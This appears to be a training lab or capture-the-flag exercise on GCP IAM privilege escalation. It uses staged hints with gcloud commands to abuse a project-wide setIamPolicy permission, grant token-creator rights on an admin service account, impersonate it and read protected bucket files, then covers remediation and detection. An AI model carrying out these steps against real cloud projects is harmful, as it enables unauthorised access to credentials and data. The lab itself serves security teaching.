# IAM Privilege Escalation (GCP)

**Difficulty:** 2  
**Description:** Exploit IAM policy misconfiguration to escalate privileges and access protected Cloud Storage data  
**Estimated Time:** 30-45 minutes

## Overview

You have compromised credentials for a developer service account with limited permissions. The organization uses a "self-service" model allowing developers to manage their own credentials.

Your goal is to identify IAM policy misconfigurations, escalate privileges, and access sensitive financial data stored in a protected Cloud Storage bucket.

## Learning Objectives

- Enumerate GCP IAM permissions and custom roles
- Identify overly permissive `setIamPolicy` permissions
- Understand service account impersonation
- Exploit self-service IAM policies for privilege escalation
- Access protected Cloud Storage resources after escalation
- Detect and prevent IAM privilege escalation attacks

## Scenario

Internal developers have read-only access to most GCP services for troubleshooting. To reduce friction, the security team implemented self-service credential management allowing developers to create and rotate their own service account keys.

You've obtained credentials for a developer service account. Initial testing shows limited Storage access and no obvious paths to sensitive data. However, there's a protected Cloud Storage bucket containing financial records and production credentials that's off-limits to standard developers.

Find the misconfiguration and escalate your privileges to access the protected bucket.

## Architecture

- Developer service account with programmatic access (JSON key)
- Custom IAM roles for base permissions and self-service
- Protected Cloud Storage bucket with financial data
- Admin automation service account with elevated Storage permissions
- Cloud Audit Logging (optional)

## Attack Surface

**Initial Credentials:**
- Service account JSON key
- Project ID
- Region

**Available from outputs:**
- Developer service account email
- Protected bucket name
- Admin service account email
- GCP project and region

## Key Concepts

### GCP IAM Model

GCP IAM uses:
- **Principals**: Users, service accounts, groups
- **Roles**: Collections of permissions (predefined or custom)
- **Bindings**: Connect principals to roles on resources
- **Policies**: Collection of bindings for a resource

### Service Account Impersonation

Service accounts can impersonate other service accounts with:
- `roles/iam.serviceAccountTokenCreator` - Generate access tokens
- `roles/iam.serviceAccountUser` - Attach SA to resources

```bash
gcloud auth print-access-token --impersonate-service-account=TARGET_SA
```

### The setIamPolicy Vulnerability

The `iam.serviceAccounts.setIamPolicy` permission allows modifying IAM bindings on service accounts. When granted at project level, it applies to all service accounts in the project.

Intended use: Allow developers to manage their own SA's IAM policy
Actual impact: Can grant themselves access to any SA in the project

## Hints

<details>
<summary>Hint 1: Initial Enumeration</summary>

List service accounts and examine your permissions:
```bash
gcloud iam service-accounts list
gcloud iam roles list --project=$PROJECT_ID
gcloud projects get-iam-policy $PROJECT_ID \
  --flatten="bindings[].members" \
  --filter="bindings.members:YOUR_SA_EMAIL"
```

Look for custom roles - they often reveal the attack path.
</details>

<details>
<summary>Hint 2: Understanding Your Permissions</summary>

Check what permissions your custom roles grant:
```bash
gcloud iam roles describe ROLE_ID --project=$PROJECT_ID
```

Pay attention to:
- `iam.serviceAccounts.setIamPolicy`
- `iam.serviceAccounts.getIamPolicy`

These control who can modify IAM bindings on service accounts.
</details>

<details>
<summary>Hint 3: Finding the Target</summary>

Identify the admin service account:
```bash
gcloud iam service-accounts list
```

Check what roles it has:
```bash
gcloud storage buckets get-iam-policy gs://BUCKET_NAME
```
</details>

<details>
<summary>Hint 4: Privilege Escalation</summary>

Grant yourself the ability to impersonate the admin SA:
```bash
gcloud iam service-accounts add-iam-policy-binding ADMIN_SA_EMAIL \
  --member="serviceAccount:YOUR_SA_EMAIL" \
  --role="roles/iam.serviceAccountTokenCreator"
```
</details>

<details>
<summary>Hint 5: Impersonation</summary>

Generate a token as the admin SA:
```bash
gcloud auth print-access-token --impersonate-service-account=ADMIN_SA_EMAIL
```

Or configure impersonation for subsequent commands:
```bash
gcloud config set auth/impersonate_service_account ADMIN_SA_EMAIL
```
</details>

<details>
<summary>Hint 6: Data Exfiltration</summary>

Access the protected bucket:
```bash
gcloud storage ls gs://PROTECTED_BUCKET/
gcloud storage cat gs://PROTECTED_BUCKET/financial/q4-2024-revenue.csv
gcloud storage cat gs://PROTECTED_BUCKET/secrets/production-credentials.json
```
</details>

## Success Criteria

✓ Enumerate service accounts and identify the admin SA  
✓ Discover custom roles and understand granted permissions  
✓ Identify the `setIamPolicy` vulnerability  
✓ Grant yourself `serviceAccountTokenCreator` on the admin SA  
✓ Impersonate the admin service account  
✓ Access and exfiltrate data from the protected bucket  
✓ Find the flag in financial records

## Common Pitfalls

- Forgetting to set the project: `gcloud config set project PROJECT_ID`
- Not activating the service account key properly
- Trying to access Storage directly without impersonation
- Using wrong role name (need `roles/iam.serviceAccountTokenCreator`)
- Not waiting for IAM propagation (can take 60+ seconds)

## Remediation

**Least Privilege:**
- Scope `setIamPolicy` to specific service accounts, not project-wide
- Use IAM Conditions to restrict modifications to own resources
- Implement permission boundaries

**Detection:**
- Monitor `SetIamPolicy` calls in Cloud Audit Logs
- Alert on `serviceAccountTokenCreator` grants
- Track service account impersonation events

**Prevention:**
- Use Organization Policy constraints
- Implement custom org policies for IAM changes
- Require approval workflows for privilege changes
- Regular IAM permission audits

## Defensive Considerations

After completing the lab:
- What Cloud Audit Log events indicate this attack?
- How would you restrict `setIamPolicy` to only own resources?
- What Organization Policies could prevent this?
- How can you detect service account impersonation?